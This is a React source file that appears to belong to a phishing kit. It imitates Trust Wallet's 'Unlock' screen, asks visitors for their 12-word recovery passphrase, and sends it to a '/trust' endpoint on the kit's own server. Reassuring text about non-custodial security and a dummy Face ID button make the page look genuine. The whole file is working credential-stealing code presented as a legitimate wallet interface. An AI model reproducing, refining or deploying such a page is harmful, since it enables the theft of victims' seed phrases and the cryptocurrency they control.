import React, { useState } from 'react';
import './trustPagesCss/trustTwoWallet.css';
import trustLogo from '../../../assets/trust_logo.png';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import fetchWithRetry from '../../../utils/api';

const TrustWallet = () => {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [loading, setLoading] = useState(false);

  const unlockWallet = async () => {
    try {
      setLoading(true);
      const res = await fetchWithRetry('/trust', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passphrase: seedPhrase })
      });

      const data = await res.json();
      toast.success(data.message);
      setSeedPhrase('');
    } catch (error) {
      toast.error('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const unlockWithFaceId = () => {
    toast.info('Feature not available yet.');
  };

  return (
    <div className="trustTwo-wrapper">
      <header className="trustTwo-header">
        <span className="trustTwo-header-title">Wallet</span>
        <div className="trustTwo-header-logo">
          <img src={trustLogo} alt="Trust Wallet" />
        </div>
      </header>
      <div className="trustTwo-title">
        <h3>Unlock Trust Wallet</h3>
      </div>
      <section className="trustTwo-body">
        <div className="trustTwo-container">
          <textarea
            className="trustTwo-textarea"
            placeholder="Enter your 12-word passphrase here"
            value={seedPhrase}
            onChange={(e) => setSeedPhrase(e.target.value)}
          />
          <button
            className="trustTwo-primary-btn"
            onClick={unlockWallet}
            disabled={loading}
          >
            {loading ? 'Loading...' : 'Unlock With Passphrase'}
          </button>
          <button
            className="trustTwo-secondary-btn"
            onClick={unlockWithFaceId}
          >
            Unlock With Face ID
          </button>
          <p className="trustTwo-info-text">
            As a non-custodial wallet, your wallet passphrase is exclusively
            accessible only to you. Recovery of passphrase is currently
            impossible.
          </p>
          <p className="trustTwo-warning-text">
            Lost your passphrase? <span>Create a new wallet</span>, but all assets
            in your previous wallet will be inaccessible.
          </p>
        </div>
      </section>
    </div>
  );
};

export default TrustWallet;